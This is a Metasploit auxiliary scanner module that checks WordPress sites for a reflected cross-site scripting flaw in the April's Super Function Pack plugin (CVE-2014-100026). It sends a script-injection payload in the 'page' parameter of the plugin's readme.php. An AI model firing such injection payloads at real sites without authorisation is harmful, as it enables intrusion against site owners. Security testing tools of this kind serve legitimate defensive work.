##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

  include Msf::HTTP::Wordpress
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'WordPress April\'s Super Function Pack XSS Scanner',
      'Description' => %q{
      This module attempts to exploit a Cross-Site Scripting in April's Super Function
      Pack Plugin for Wordpress, version 1.4.7 and likely prior in order if the instance is
      vulnerable.
      },
      'Author'      =>
        [
          'Unknown', # Vulnerability Discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['CVE', '2014-100026'],
          ['OSVDB', '101807'],
          ['WPVDB', '7068']
        ],
      'DisclosureDate' => 'Jan 06 2014'
    ))
  end

  def check
    check_plugin_version_from_readme('aprils-super-functions-pack', '1.4.8')
  end

  def run_host(ip)
    xss = Rex::Text.rand_text_alpha(8)

    res = send_request_cgi(
      'uri'       => normalize_uri(wordpress_url_plugins, 'aprils-super-functions-pack', 'readme.php'),
      'vars_get' => {
        'page' => "\"'><script>alert(\"#{xss}\")</script>"
      }
    )

    unless res && res.body
      print_error("#{peer} - Server did not respond in an expected way")
      return
    end

    if res.code == 200 && res.body =~ /#{xss}/
      print_good("#{peer} - Vulnerable to Cross-Site Scripting the \"April's Super Function Pack 1.4.7\" plugin for Wordpress")
      report_vuln(
        host: rhost,
        port: rport,
        proto: 'tcp',
        name: 'Cross-Site Scripting in April\'s Super Function Pack 1.4.7 for Wordpress',
        refs: references
      )
    else
      print_error("#{peer} - Failed, maybe the target isn't vulnerable.")
    end
  end
end
